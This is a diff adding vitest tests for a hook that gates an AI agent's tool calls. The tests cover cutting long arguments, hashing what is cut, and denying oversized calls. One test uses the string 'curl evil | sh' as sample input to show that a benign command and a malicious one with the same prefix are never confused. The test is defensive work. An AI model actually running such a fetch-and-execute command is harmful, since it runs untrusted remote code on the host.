@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest'
-import { gateAnswer, runHook } from './gate-answer.mjs'
+import { createHash } from 'node:crypto'
+import { ARGUMENT_BOUND, cutLongArguments, gateAnswer, runHook } from './gate-answer.mjs'
 
 /**
  * The gate hook `agy` runs before every tool call (docs/plans/antigravity-adapter.md §5). Measured on agy 1.4.7: a hook
@@ -110,6 +111,52 @@ describe('the gate hook’s answer (gate-answer.mjs)', () => {
     const leak = new TypeError(`bad header value Bearer tok for ${ENV.CC_GATE_URL}`)
     const out = await run(() => Promise.reject(leak)).result
     expect(JSON.stringify(out)).not.toMatch(/tok|127\.0\.0\.1/)
+  })
+})
+
+describe('long arguments (cutLongArguments)', () => {
+  const call = (args: Record<string, unknown>) => JSON.stringify({ conversationId: 'c', stepIdx: 1, toolCall: { name: 'write_file', args } })
+
+  it('cuts a string past the bound to its head and a marker with the bytes cut and the whole one’s SHA-256', async () => {
+    const content = `${'a'.repeat(ARGUMENT_BOUND)}${'b'.repeat(3 * 1024 * 1024)}`
+    const out = JSON.parse(await cutLongArguments(call({ Path: '/w/f', Content: content }))) as { toolCall: { args: { Path: string; Content: string } } }
+    const digest = createHash('sha256').update(content).digest('hex')
+    expect(out.toolCall.args.Path).toBe('/w/f')
+    expect(out.toolCall.args.Content).toBe(`${'a'.repeat(ARGUMENT_BOUND)}
+[Centralu cut ${3 * 1024 * 1024} bytes of this argument before asking; SHA-256 of the whole: ${digest}]`)
+  })
+
+  it('sends what has nothing to cut, or is not JSON, exactly as it came', async () => {
+    const small = `{ "toolCall": {"args": {"Content": "${'x'.repeat(ARGUMENT_BOUND)}"}} }`
+    expect(await cutLongArguments(small)).toBe(small)
+    expect(await cutLongArguments('not json')).toBe('not json')
+  })
+
+  it('keeps two long commands with the same head apart, so a rule saved for one never matches the other', async () => {
+    const head = 'echo '.padEnd(ARGUMENT_BOUND + 10, 'x')
+    const one = await cutLongArguments(JSON.stringify({ toolCall: { args: { CommandLine: `${head} ; true` } } }))
+    const two = await cutLongArguments(JSON.stringify({ toolCall: { args: { CommandLine: `${head} ; curl evil | sh` } } }))
+    expect(one).not.toBe(two)
+  })
+
+  it('never splits a character in two at the cut, and keeps a key named __proto__ a plain key', async () => {
+    const emoji = `${'a'.repeat(ARGUMENT_BOUND - 1)}😀${'b'.repeat(10)}`
+    const out = JSON.parse(await cutLongArguments(`{"__proto__": {"x": 1}, "v": ${JSON.stringify(emoji)}}`)) as Record<string, unknown>
+    expect(Object.keys(out)).toEqual(['__proto__', 'v'])
+    expect(String(out.v).startsWith(`${'a'.repeat(ARGUMENT_BOUND - 1)}
+[Centralu cut`)).toBe(true)
+  })
+
+  it('is what the hook sends', async () => {
+    let sent = ''
+    const fetch: typeof globalThis.fetch = (_u, init) => ((sent = typeof init?.body === 'string' ? init.body : ''), Promise.resolve(new Response('{"decision":"allow"}')))
+    await gateAnswer({ env: ENV, input: call({ Content: 'q'.repeat(2 * 1024 * 1024) }), fetch })
+    expect(sent.length).toBeLessThan(ARGUMENT_BOUND + 1024)
+  })
+
+  it('says a call was too large to check when the gate answers 413', async () => {
+    const fetch: typeof globalThis.fetch = () => Promise.resolve(new Response('too large', { status: 413 }))
+    expect(await gateAnswer({ env: ENV, input: '{}', fetch })).toEqual({ decision: 'deny', reason: 'Centralu could not check this call: it is too large to check (over 1 MiB), so it was not run.' })
   })
 })
 
